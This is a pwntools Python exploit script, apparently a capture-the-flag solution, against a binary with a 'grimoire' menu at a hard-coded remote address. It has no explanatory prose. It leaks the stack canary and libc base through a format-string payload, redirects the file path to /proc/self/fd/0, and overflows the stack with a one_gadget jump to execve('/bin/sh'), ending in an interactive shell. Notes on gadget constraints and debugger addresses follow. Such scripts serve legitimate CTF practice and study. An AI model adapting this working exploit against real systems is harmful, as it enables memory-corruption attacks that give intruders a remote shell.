from pwn import *


#r = process("./chall")
#r = remote("localhost","1337")
r = remote("13.231.207.73","9008")
#r = remote("172.17.0.3","1337")
GRIMOIRE_SIZE = 0x200

def grimoire_open():
        log.info("G_OPEN")
        r.sendlineafter("> ","1")

def grimoire_read():
        log.info("G_READ")
        r.sendlineafter("> ","2")

def grimoire_edit(offset,data):
        log.info("G_EDIT +%x" % offset)
        r.sendlineafter("> ","3")
        r.sendlineafter("Offset: ",str(offset))
        r.sendafter("Text: ",data)

def grimoire_close():
        log.info("G_CLOSE")
        r.sendlineafter("> ","2")

grimoire_open()
grimoire_read()

def do_format_string(format_str):
        data = ""
        data += p64(0x0) + p64(0x1)
        data += "\x00" * 0x10
        data += format_str
        grimoire_edit(0x200,data)
        grimoire_open()

def fix_path():
        return


"""
data = ""
data += "A" * (0x200 - 0x1c0)
data += "\x00" * 8

grimoire_edit(0x1c0,data)
pause()
grimoire_open()
grimoire_read()
r.recvuntil("*---------------------------------AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

leek = u64(r.recv(numb=6).ljust(8,"\x00")) # its size is 0x1f0
log.success("HEAP LEEK -> "+hex(leek)) # heap leak useless 
"""
grimoire_open()
pause()
do_format_string(R"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.")
leaks = r.recvline().rstrip()
leaks = leaks.split(".")
canary = leaks[9]
libc   = leaks[-3]
log.success("CANARY -> "+canary)
log.success("LIBC -> "+libc)
libc_base = int(libc,16) - 0x3e7638
canary = int(canary,16)
log.success("BASE ->"+hex(libc_base))

data = ""
data += p64(0x0) * 4
data += "/proc/self/fd/0\x00"
grimoire_edit(0x200,data)
rop = ""
rop += "A"*0x208
rop += p64(canary)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(libc_base + 0x10a38c)
rop += "\x00" * (0xffff - len(rop))
grimoire_open()
grimoire_read()
r.send(rop)
r.interactive()

"""
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

"""

$4 = (<data variable, no debug info> *) 0x202060 <text>
$2 = (<data variable, no debug info> *) 0x202260 <fp>
$3 = (<data variable, no debug info> *) 0x202268 <init>
$1 = (<data variable, no debug info> *) 0x202280 <filepath>
"""
